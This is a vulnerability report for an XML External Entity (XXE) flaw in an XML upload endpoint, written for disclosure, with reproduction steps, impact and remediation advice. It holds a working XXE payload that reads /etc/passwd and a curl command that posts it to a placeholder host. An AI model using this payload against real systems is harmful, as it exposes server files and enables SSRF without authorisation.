### 🐞 Bug Report: XML External Entity (XXE) Vulnerability

**Reported By:** Raghav Arora  
**LinkedIn:** [https://www.linkedin.com/in/iamraghavarora](https://www.linkedin.com/in/iamraghavarora)  
**Severity:** High  
**Date Reported:** 2025-06-16

---

### 📄 Summary

An **XML External Entity (XXE)** vulnerability was discovered in the application's XML parsing functionality. This vulnerability allows attackers to exploit the XML parser by submitting malicious XML data containing references to external entities. It can lead to disclosure of sensitive files, denial of service, or server-side request forgery (SSRF).

---

### 📌 Affected Component

- Endpoint: `/api/upload-xml`  
- Functionality: XML File Upload / API XML Input Handling

---

### 🚨 Proof of Concept (PoC)

**Payload Submitted:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
  <data>&xxe;</data>
</root>
```

**Steps to Reproduce:**

1. Use any tool like `curl` or Burp Suite to send the XML payload to the vulnerable endpoint:
   ```bash
   curl -X POST https://example-vulnerable.com/api/upload-xml \
   -H "Content-Type: application/xml" \
   --data-binary @malicious.xml
   ```

2. Observe the server’s response. If it includes contents of `/etc/passwd`, the XXE attack was successful.

---

### ❗ Observed Result

- The server responded with internal file contents such as:
  ```
  root:x:0:0:root:/root:/bin/bash
  ```

---

### ✅ Expected Result

- The server should **not parse external entities** and should reject the file with an error message like:
  ```json
  {
    "error": "External entities not allowed in XML input."
  }
  ```

---

### 🎯 Impact

- Exposure of sensitive system files (e.g., `/etc/passwd`, config files)
- Server-side request forgery (SSRF)
- Denial of service via entity expansion (Billion Laughs attack)
- Credential or token exposure if connected to cloud environments
- Potential remote code execution depending on system setup

---

### 🛠️ Suggested Remediation

- Disable DTDs (external entities) entirely in the XML parser configuration.
- Use secure parsers (e.g., `defusedxml` in Python, or Java XML parsers with XXE disabled).
- Apply strong input validation and schema restrictions.
- Monitor for unusual XML traffic or repeated file read patterns.

---

### 🔒 Security Best Practices

- Avoid XML when possible in favor of safer formats like JSON.
- Harden XML parsers by disabling features like entity resolution, DTDs.
- Implement WAF rules to detect malicious XML payloads.
- Log all parsing exceptions and monitor anomalies.

---

### 🙏 Note to Security Team / Senior Reviewer

XXE attacks can lead to **serious data breaches** and compromise of internal infrastructure. It is highly recommended to audit all XML-handling endpoints and implement strict parser configurations across all services that consume XML input.
